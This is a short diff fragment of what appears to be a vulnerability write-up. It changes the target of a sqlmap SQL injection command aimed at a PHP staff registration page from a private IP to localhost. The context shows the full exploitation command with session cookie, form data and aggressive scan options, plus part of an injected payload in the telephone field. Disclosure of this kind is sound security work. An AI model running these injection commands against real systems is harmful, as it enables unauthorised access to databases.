@@ -60,7 +60,7 @@ dmun=superAdmin&fname=polaris&lname=Blue&addr=1066 Front St&tel=178493927' AND (
 ```
 ## 7.4 Exploitation Steps with sqlmap
 ```bash
-sqlmap -u "10.211.55.6:1133/staff.php" \
+sqlmap -u "localhost:8000/staff.php" \
        --cookie="PHPSESSID=nn14c3dea64e57kvj0896m3djm" \
        --data="dmun=superAdmin&fname=polaris&lname=Blue&addr=1066+Front+St&tel=178493927&email=hacker0x1%40163.com&gender=Male&smbdd=2024-12-10&typesm=Doctor&workt=Evening&submit=SUBMIT" \
        --batch --level=5 --risk=3 --dbms=mysql \
